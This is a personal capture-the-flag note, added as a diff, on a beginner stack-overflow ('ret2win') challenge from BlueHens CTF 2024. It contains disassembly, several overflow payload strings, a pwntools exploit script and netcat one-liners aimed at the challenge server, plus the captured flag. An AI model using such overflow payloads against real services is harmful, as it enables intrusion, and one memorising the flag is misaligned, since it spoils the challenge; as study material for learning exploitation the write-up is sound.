@@ -1,0 +1,109 @@
+= 2024年11月10日
+
+== BlueHens CTF 2024
+
+=== Training Problem: Intro to PWN 
+
+``nc 0.cloud.chals.io 13545``
+
+----
+0000000000401196 <win>:
+  401196:	f3 0f 1e fa          	endbr64
+  40119a:	55                   	push   %rbp
+  40119b:	48 89 e5             	mov    %rsp,%rbp
+  40119e:	48 8d 05 5f 0e 00 00 	lea    0xe5f(%rip),%rax        # 402004 <_IO_stdin_used+0x4>
+  4011a5:	48 89 c7             	mov    %rax,%rdi
+  4011a8:	e8 d3 fe ff ff       	call   401080 <system@plt>
+  4011ad:	90                   	nop
+  4011ae:	5d                   	pop    %rbp
+  4011af:	c3                   	ret
+
+00000000004011b0 <vuln>:
+  4011b0:	f3 0f 1e fa          	endbr64
+  4011b4:	55                   	push   %rbp
+  4011b5:	48 89 e5             	mov    %rsp,%rbp
+  4011b8:	48 83 ec 30          	sub    $0x30,%rsp
+  4011bc:	48 8d 05 49 0e 00 00 	lea    0xe49(%rip),%rax        # 40200c <_IO_stdin_used+0xc>
+  4011c3:	48 89 c7             	mov    %rax,%rdi
+  4011c6:	e8 a5 fe ff ff       	call   401070 <puts@plt>
+  4011cb:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
+  4011cf:	48 89 c7             	mov    %rax,%rdi
+  4011d2:	b8 00 00 00 00       	mov    $0x0,%eax
+  4011d7:	e8 b4 fe ff ff       	call   401090 <gets@plt>
+  4011dc:	90                   	nop
+  4011dd:	c9                   	leave
+  4011de:	c3                   	ret
+
+00000000004011df <main>:
+  4011df:	f3 0f 1e fa          	endbr64
+  4011e3:	55                   	push   %rbp
+  4011e4:	48 89 e5             	mov    %rsp,%rbp
+  4011e7:	48 8b 05 82 2e 00 00 	mov    0x2e82(%rip),%rax        # 404070 <stdin@GLIBC_2.2.5>
+  4011ee:	b9 01 00 00 00       	mov    $0x1,%ecx
+  4011f3:	ba 02 00 00 00       	mov    $0x2,%edx
+  4011f8:	be 00 00 00 00       	mov    $0x0,%esi
+  4011fd:	48 89 c7             	mov    %rax,%rdi
+  401200:	e8 9b fe ff ff       	call   4010a0 <setvbuf@plt>
+  401205:	48 8b 05 54 2e 00 00 	mov    0x2e54(%rip),%rax        # 404060 <stdout@GLIBC_2.2.5>
+  40120c:	b9 01 00 00 00       	mov    $0x1,%ecx
+  401211:	ba 02 00 00 00       	mov    $0x2,%edx
+  401216:	be 00 00 00 00       	mov    $0x0,%esi
+  40121b:	48 89 c7             	mov    %rax,%rdi
+  40121e:	e8 7d fe ff ff       	call   4010a0 <setvbuf@plt>
+  401223:	48 8b 05 56 2e 00 00 	mov    0x2e56(%rip),%rax        # 404080 <stderr@GLIBC_2.2.5>
+  40122a:	b9 01 00 00 00       	mov    $0x1,%ecx
+  40122f:	ba 02 00 00 00       	mov    $0x2,%edx
+  401234:	be 00 00 00 00       	mov    $0x0,%esi
+  401239:	48 89 c7             	mov    %rax,%rdi
+  40123c:	e8 5f fe ff ff       	call   4010a0 <setvbuf@plt>
+  401241:	b8 00 00 00 00       	mov    $0x0,%eax
+  401246:	e8 65 ff ff ff       	call   4011b0 <vuln>
+  40124b:	b8 00 00 00 00       	mov    $0x0,%eax
+  401250:	5d                   	pop    %rbp
+  401251:	c3                   	ret
+----
+
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x90\x90\x90\x90\x90\x90\x90\x90\x9e\x11\x40
+
+401196
+
+
+\x96\x11\x40\x00
+
+\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x90\x90\x90\x90\xc0\x11\x40\x00
+\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x90\x90\x90\x90\xc0\x11\x40\x00
+\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x90\x90\x90\x90\xc0\x11\x40\x00
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xc0\x11\x40\x00
+
+
+take note of: ``0x7ffff7e16f5b <do_system+016b> movaps XMMWORD PTR [rsp+0x50], xmm0``
+
+you need to add another 4 bytes to the address because of **movaps**.
+
+[, python]
+----
+from pwn import *
+
+context.log_level = 'debug'
+
+binary_path = "./pwnme"
+
+elf = ELF(binary_path)
+
+web = remote("0.cloud.chals.io", 13545)
+print(web.recv())
+web.sendline(b"A"*48 + b"\x90"*8 + b"\x9e\x11\x40")
+web.interactive()
+----
+
+udctf{h00r4y_I_am_a_pwn3r_n0w}
+
+
+i dont get why this works but not using ``echo -ne "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x90\x90\x90\x90\x90\x90\x90\x90\x9e\x11\x40" | nc 0.cloud.chals.io 13545``
+
+
+(echo -ne "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x90\x90\x90\x90\x90\x90\x90\x90\x9e\x11\x40" && cat) | nc 0.cloud.chals.io 13545
+
+don't use `-n` flag, removes `\x0a` byte at the end
